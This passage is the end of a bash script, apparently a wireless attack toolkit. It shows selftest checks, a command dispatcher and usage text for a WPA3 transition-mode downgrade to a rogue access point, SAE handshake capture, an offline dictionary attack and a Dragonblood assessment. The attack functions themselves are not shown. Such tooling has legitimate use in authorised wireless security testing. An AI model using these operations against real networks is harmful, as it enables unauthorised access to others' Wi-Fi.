    chk status-no-exit-error "$(printf '%s\n' "$st_out" | grep -c 'command not found')" 0
    chk status-fields        "$(printf '%s\n' "$st_out" | awk -F'\t' '$1=="injection_state"{c++} END{print c+0}')" 1

    # 12. Scratch must not survive the selftest.
    rm -rf "$st"
    chk scratch-clean "$([[ -e "$st" ]] && echo left || echo clean)" clean

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── dispatch ─────────────────────────────────────────────────────────────

w3_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)      w3_status_tsv ;;
        --check-deps)      w3_check_deps ;;
        --transition-tsv)  w3_transition_tsv "${1:-}" ;;
        --downgrade)       w3_downgrade "$@" ;;
        --capture)         w3_capture "$@" ;;
        --sae-brute)       w3_sae_brute "$@" ;;
        --dragonblood)     w3_dragonblood_assess "${1:-}" ;;
        --classify-aki)    w3_classify_aki "${1:-}" ;;
        --selftest)        w3_selftest ;;
        --info)            w3_info ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv              tools + interfaces; OFFLINE vs RADIO capability
  --check-deps              tool presence with install hints
  --transition-tsv [FILE]   classify APs: WPA3-only / WPA2+WPA3 / WPA2-only
                            (airodump-ng CSV, 5-col CSV, pcap, or stdin)
  --downgrade BSSID ESSID CHANNEL [DUR]
                            transition-mode downgrade to rogue WPA2-only AP
                            (also accepts the GUI order IFACE BSSID CHAN DUR)
  --capture BSSID ESSID CHANNEL [DUR]
                            capture an SAE exchange for offline work
  --sae-brute BSSID ESSID WORDLIST
                            OFFLINE mode-22000 dictionary attack on a capture
  --dragonblood [PCAP]      Dragonblood CVE report + capture assessment
  --classify-aki SUITES...  decode AKM suite values to a class
  --selftest
  --info                    SAE, H2E, transition mode, Dragonblood, radio needs
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    WIFISTING_CLI=1
    declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
    declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
    declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
    w3_cli_main "$@"
fi
